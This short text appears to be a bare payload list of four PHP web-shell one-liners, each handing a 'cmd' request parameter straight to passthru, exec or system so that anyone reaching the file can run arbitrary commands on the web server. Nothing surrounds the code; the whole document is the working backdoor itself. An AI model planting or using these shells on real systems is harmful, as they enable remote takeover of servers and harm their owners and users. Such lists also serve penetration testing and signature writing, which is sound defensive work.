<?php echo passthru($_GET['cmd']); ?>

<?php echo exec($_POST['cmd']); ?>

<?php system($_GET['cmd']); ?>

<?php passthru($_REQUEST['cmd']); ?>
